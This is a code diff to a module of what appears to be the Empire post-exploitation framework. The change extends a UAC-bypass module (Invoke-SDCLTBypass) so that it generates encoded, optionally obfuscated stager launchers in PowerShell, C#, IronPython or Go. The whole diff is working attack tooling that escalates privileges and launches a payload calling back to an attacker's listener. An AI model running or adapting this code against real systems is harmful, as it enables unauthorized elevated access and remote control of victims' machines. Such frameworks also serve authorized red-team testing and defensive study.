@@ -16,34 +16,55 @@ class Module:
         obfuscation_command: str = "",
         script: str = "",
     ):
-        # staging options
         listener_name = params["Listener"]
+        language = params.get("Language", "powershell")
         user_agent = params["UserAgent"]
         proxy = params["Proxy"]
         proxy_creds = params["ProxyCreds"]
-        launcher_obfuscate = params["Obfuscate"].lower() == "true"
-        launcher_obfuscate_command = params["ObfuscateCommand"]
+        obf = params["Obfuscate"].lower() == "true"
+        obf_cmd = params["ObfuscateCommand"]
+        bypasses = params["Bypasses"]
 
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
-            # not a valid listener, return nothing for the script
             raise ModuleValidationException("Invalid listener: " + listener_name)
 
-        # generate the PowerShell one-liner with all of the proper options set
-        launcher = main_menu.stagergenv2.generate_launcher(
-            listener_name=listener_name,
-            language="powershell",
-            encode=True,
-            obfuscate=launcher_obfuscate,
-            obfuscation_command=launcher_obfuscate_command,
-            user_agent=user_agent,
-            proxy=proxy,
-            proxy_creds=proxy_creds,
-            bypasses=params["Bypasses"],
-        )
+        lang = language.lower()
 
-        enc_script = launcher.split(" ")[-1]
-        if launcher == "":
+        if lang == "powershell":
+            launcher = main_menu.stagergenv2.generate_launcher(
+                listener_name=listener_name,
+                language="powershell",
+                encode=True,
+                obfuscate=obf,
+                obfuscation_command=obf_cmd,
+                user_agent=user_agent,
+                proxy=proxy,
+                proxy_creds=proxy_creds,
+                bypasses=bypasses,
+            )
+        elif lang in ("csharp", "ironpython"):
+            launcher = main_menu.stagergenv2.generate_exe_oneliner(
+                language=lang,
+                obfuscate=obf,
+                obfuscation_command=obf_cmd,
+                encode=True,
+                listener_name=listener_name,
+            )
+        elif lang == "go":
+            launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
+                language=lang,
+                obfuscate=obf,
+                obfuscation_command=obf_cmd,
+                encode=True,
+                listener_name=listener_name,
+            )
+        else:
+            raise ModuleValidationException(f"Language '{language}' not supported.")
+
+        if not launcher:
             raise ModuleValidationException("Error in launcher generation.")
 
-        script_end = f'Invoke-SDCLTBypass -Command "{enc_script}";`n"Invoke-SDCLTBypass completed!"'
+        enc_script = launcher.split(" ")[-1]
+        script_end = f'Invoke-SDCLTBypass -Command "{enc_script}"'
+
         return script, script_end
